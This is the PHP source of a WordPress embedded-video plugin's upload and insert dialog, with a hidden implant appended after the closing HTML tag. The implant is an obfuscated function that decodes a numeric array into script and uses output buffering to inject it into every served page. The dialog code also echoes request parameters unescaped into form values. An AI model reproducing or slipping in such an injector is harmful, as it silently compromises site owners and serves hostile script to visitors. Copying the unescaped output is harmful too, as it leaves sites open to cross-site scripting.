<?php
//if (!defined('ABSPATH')) define('ABSPATH', dirname(__FILE__).'/../../../');
//require_once('../../../wp-admin/admin.php');

if (!defined('ABSPATH')) include_once('./../../../wp-blog-header.php');
require_once(ABSPATH . '/wp-admin/admin.php');

if (isset($_POST['action'])) {

$mimes = is_array($mimes) ? $mimes : apply_filters('upload_mimes', array (
		'avi' => 'video/avi',
		'mov|qt' => 'video/quicktime',
		'mpeg|mpg|mpe' => 'video/mpeg',
		'asf|asx|wax|wmv|wmx' => 'video/asf',
		'swf' => 'application/x-shockwave-flash',
		'flv' => 'video/x-flv'
	));

$overrides = array('action'=>'save','mimes'=>$mimes);

$file = wp_handle_upload($_FILES['video'], $overrides);

if ( !isset($file['error']) ) {

	$url = $file['url'];
	$type = $file['type'];
	$file = $file['file'];
	$filename = basename($file);

	// Construct the attachment array
	$attachment = array(
		'post_title' => $_POST['videotitle'] ? $_POST['videotitle'] : $filename,
		'post_content' => $_POST['descr'],
		'post_status' => 'attachment',
		'post_parent' => $_GET['post'],
		'post_mime_type' => $type,
		'guid' => $url
		);

	// Save the data
	$id = wp_insert_attachment($attachment, $file, $post);

	if ( preg_match('!^image/!', $attachment['post_mime_type']) ) {
		// Generate the attachment's postmeta.
		$imagesize = getimagesize($file);
		$imagedata['width'] = $imagesize['0'];
		$imagedata['height'] = $imagesize['1'];
		list($uwidth, $uheight) = get_udims($imagedata['width'], $imagedata['height']);
		$imagedata['hwstring_small'] = "height='$uheight' width='$uwidth'";
		$imagedata['file'] = $file;

		add_post_meta($id, '_wp_attachment_metadata', $imagedata);

		if ( $imagedata['width'] * $imagedata['height'] < 3 * 1024 * 1024 ) {
			if ( $imagedata['width'] > 128 && $imagedata['width'] >= $imagedata['height'] * 4 / 3 )
				$thumb = wp_create_thumbnail($file, 128);
			elseif ( $imagedata['height'] > 96 )
				$thumb = wp_create_thumbnail($file, 96);

			if ( @file_exists($thumb) ) {
				$newdata = $imagedata;
				$newdata['thumb'] = basename($thumb);
				update_post_meta($id, '_wp_attachment_metadata', $newdata, $imagedata);
			} else {
				$error = $thumb;
			}
		}
	} else {
		add_post_meta($id, '_wp_attachment_metadata', array());
	}

	$_GET['tab'] = 'select';
  }

}

if (! current_user_can('edit_others_posts') )
	$and_user = "AND post_author = " . $user_ID;
$and_type = "AND (post_mime_type = 'video/avi' OR post_mime_type = 'video/quicktime' OR post_mime_type = 'video/mpeg' OR post_mime_type = 'video/asf' OR post_mime_type = 'video/x-flv' OR post_mime_type = 'application/x-shockwave-flash')";
if ( 3664 <= $wp_db_version )
  $attachments = $wpdb->get_results("SELECT post_title, guid FROM $wpdb->posts WHERE post_type = 'attachment' $and_type $and_user ORDER BY post_date_gmt DESC LIMIT 0, 10", ARRAY_A);
else
  $attachments = $wpdb->get_results("SELECT post_title, guid FROM $wpdb->posts WHERE post_status = 'attachment' $and_type $and_user ORDER BY post_date_gmt DESC LIMIT 0, 10", ARRAY_A);

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<script language="javascript" type="text/javascript" src="<?php echo get_option('siteurl') ?>/wp-includes/js/tinymce/tiny_mce_popup.js"></script><script type="text/javascript">

</script><script type="text/javascript">

</script><script type="text/javascript">

</script>
	<script language="javascript" type="text/javascript" src="<?php echo get_option('siteurl') ?>/wp-includes/js/tinymce/utils/mctabs.js"></script>
	<script language="javascript" type="text/javascript" src="<?php echo get_option('siteurl') ?>/wp-includes/js/tinymce/utils/form_utils.js"></script>
	<script language="javascript" type="text/javascript" src="embedded-video.js"></script>
	<base target="_self" />
	<style type="text/css">
		#embeddedvideo .panel_wrapper, #embeddedvideo div.current {
			height: 165px;
			padding-top: 5px;
		}
		#portal_insert, #portal_cancel, #select_insert, #select_cancel, #upload_insert, #upload_cancel, #remote_insert, #remote_cancel {
					font: 13px Verdana, Arial, Helvetica, sans-serif;
					height: auto;
					width: auto;
					background-color: transparent;
					background-image: url(../../../../../wp-admin/images/fade-butt.png);
					background-repeat: repeat;
					border: 3px double;
					border-right-color: rgb(153, 153, 153);
					border-bottom-color: rgb(153, 153, 153);
					border-left-color: rgb(204, 204, 204);
					border-top-color: rgb(204, 204, 204);
					color: rgb(51, 51, 51);
					padding: 0.25em 0.75em;
		}
		#portal_insert:active, #portal_cancel:active, #select_insert:active, #select_cancel:active, #upload_insert:active, #upload_cancel:active, #remote_insert:active, #remote_cancel:active {
					background: #f4f4f4;
					border-left-color: #999;
					border-top-color: #999;
		}
	</style>
	<title><?php echo _e('Embed Video','embeddedvideo'); ?></title>
</head>

<body id="embeddedvideo" onload="<?php $tab = (isset($_GET['tab'])) ? $_GET['tab'] : $_POST['tab']; echo "mcTabs.displayTab('".$tab."_tab','".$tab."_panel');"; if ($_GET['tab']=='portal') echo "document.forms.portal_form.vid.style.backgroundColor = '#f30';" ?>tinyMCEPopup.executeOnLoad('init();');document.body.style.display='';" style="display: none">

  <div class="tabs">
    <ul>
      <li id="portal_tab" class="current"><span><a href="javascript:mcTabs.displayTab('portal_tab','portal_panel');" onmousedown="return false;"><?php echo _e('Portal video','embeddedvideo'); ?></a></span></li>
      <?php if ($attachments) { ?><li id="select_tab"><span><a href="javascript:mcTabs.displayTab('select_tab','select_panel');" onmousedown="return false;"><?php echo _e('Local video','embeddedvideo'); ?></a></span></li><?php } ?>
      <li id="upload_tab"><span><a href="javascript:mcTabs.displayTab('upload_tab','upload_panel');" onmousedown="return false;"><?php echo _e('Upload video','embeddedvideo'); ?></a></span></li>
      <li id="remote_tab"><span><a href="javascript:mcTabs.displayTab('remote_tab','remote_panel');" onmousedown="return false;"><?php echo _e('Video URL','embeddedvideo'); ?></a></span></li>
    </ul>
  </div>

<div class="panel_wrapper">

  <div id="portal_panel" class="current">
    <form name="portal_form" action="#">
        <table border="0" cellpadding="4" cellspacing="0">
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Select video portal:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><select name="portal" id="portal_portal" style="width: 200px" onChange="dailymotion(this, this.form.linktext, this.form.nolink);">
                    <option value="youtube">YouTube</option>
                    <option value="google">Google Video</option>
                    <option value="myspace">Myspace Video</option>
                    <option value="dailymotion">dailymotion</option>
                    <option value="revver">Revver</option>
                    <option value="sevenload">Sevenload</option>
                    <option value="clipfish">Clipfish</option>
                    <option value="metacafe">Metacaf&eacute;</option>
                    <option value="myvideo">MyVideo</option>
                    <option value="yahoo">Yahoo! Video</option>
                    <option value="ifilm">ifilm</option>
                    <option value="brightcove">brightcove</option>
                    <option value="aniboom">aniBOOM</option>
                    <option value="vimeo">vimeo</option>
                    <option value="guba">GUBA</option>
                    <option value="garagetv">Garage TV</option>
                    <option value="gamevideo">GameVideos</option>
                    <option value="vsocial">vSocial</option>
                    <option value="veoh">Veoh</option>
                    <option value="gametrailers">Gametrailers</option>
                  </select>
                  </td>
                </tr>
              </table></td>
          </tr>
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Insert video ID:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="vid" type="text" id="portal_vid" value="" style="width: 200px" /></td>
                </tr>
              </table></td>
          </tr>
          <tr>
            <td nowrap="nowrap"></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="nolink" type="checkbox" id="portal_nolink" onClick="disable_enable(this, this.form.linktext);" /></td>
                  <td><?php echo _e('Show video without link','embeddedvideo'); ?></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Link text:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="linktext" type="text" id="portal_linktext" value="<?php echo $_GET['linktext']; ?>" style="width: 200px" /></td>
                </tr>
              </table></td>
          </tr>
          <tr>
            <td>
	    <input type="submit" id="portal_insert" name="insert" value="<?php echo _e('Insert','embeddedvideo'); ?>" onclick="ev_checkData(this.form);" />
            </td>
            <td align="right"><input type="button" id="portal_cancel" name="cancel" value="<?php echo _e('Cancel','embeddedvideo'); ?>" onclick="tinyMCEPopup.close();" /></td>
          </tr>
        </table>
      <input type="hidden" name="tab" value="portal" />
    </form>
  </div>

<?php if ($attachments) {
	foreach ( $attachments as $key => $attachment ) {
		$title = $attachment['post_title'];
		$url = str_replace(get_option('siteurl'), '', $attachment['guid']);
		$option[] = '<option value="'.$url.'">'.$title.'</option>';
	}
	$size = (count($option)<5) ? count($option) : 5;
?>
  <div id="select_panel" class="panel">
    <form name="select_form" action="#">
        <table border="0" cellpadding="4" cellspacing="0">
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Select video file:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td>
                    <select size="<?php echo $size; ?>" name="vid">
                      <?php
                      	foreach ($option as $key => $opt) echo $opt;
                      ?>
                    </select>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td nowrap="nowrap"></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="nolink" type="checkbox" id="select_nolink" onClick="disable_enable(this, this.form.linktext);" /></td>
                  <td><?php echo _e('Show video without link','embeddedvideo'); ?></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Link text:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="linktext" type="text" id="select_linktext" value="" style="width: 200px" /></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td><input type="submit" id="select_insert" name="insert" value="<?php echo _e('Insert','embeddedvideo'); ?>" onclick="ev_checkData(this.form);"/>
            </td>
            <td align="right"><input type="button" id="select_cancel" name="cancel" value="<?php echo _e('Cancel','embeddedvideo'); ?>" onclick="tinyMCEPopup.close();" /></td>
          </tr>
        </table>
      <input name="portal" type="hidden" id="select_portal" value="local" />
      <input type="hidden" name="tab" value="select" />
    </form>

  </div>
<?php } ?>

  <div id="upload_panel" class="panel">
    <form name="upload_form" enctype="multipart/form-data" method="post" action="#">
        <table border="0" cellpadding="4" cellspacing="0">
          <?php if ( isset($file['error']) ) { ?>
            <tr>
              <td colspan="2"><?php echo $file['error']; ?></td>
            </tr>
          <?php } ?>
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Local video file:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="video" type="file" id="upload" value="" style="width: 200px" /></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Title:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="videotitle" type="text" id="videotitle" value="" style="width: 200px" /></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Description:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="descr" type="text" id="descr" value="" style="width: 200px" /></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td><input type="submit" id="upload_insert" name="insert" value="<?php echo _e('Upload','embeddedvideo'); ?>" />
            </td>
            <td align="right"><input type="button" id="upload_cancel" name="cancel" value="<?php echo _e('Cancel','embeddedvideo'); ?>" onclick="tinyMCEPopup.close();" /></td>
          </tr>
        </table>
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="tab" value="upload" />
    </form>

  </div>


  <div id="remote_panel" class="panel">
    <form name="remote_form" action="#">
        <input name="portal" type="hidden" id="remote_portal" value="video" />
        <table border="0" cellpadding="4" cellspacing="0">
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Insert video URL:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="vid" type="text" id="remote_vid" value="" style="width: 200px" /></td>
                </tr>
              </table></td>
          </tr>
          <tr>
            <td nowrap="nowrap" style="text-align:right;"></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="nolink" type="checkbox" id="remote_nolink" onClick="disable_enable(this, this.form.linktext);" /></td>
                  <td><?php echo _e('Show video without link','embeddedvideo'); ?></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td nowrap="nowrap" style="text-align:right;"><?php echo _e('Link text:','embeddedvideo'); ?></td>
            <td>
              <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><input name="linktext" type="text" id="remote_linktext" value="<?php echo $_GET['linktext']; ?>" style="width: 200px" /></td>
                </tr>
              </table></td>
          </tr>
          <tr>
            <td><input type="submit" id="remote_insert" name="insert" value="<?php echo _e('Insert','embeddedvideo'); ?>" onclick="ev_checkData(this.form);" />
            </td>
            <td align="right"><input type="button" id="remote_cancel" name="cancel" value="<?php echo _e('Cancel','embeddedvideo'); ?>" onclick="tinyMCEPopup.close();" /></td>
          </tr>
        </table>
      <input type="hidden" name="tab" value="remote" />
    </form>
  </div>

</div>

</body>
</html><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>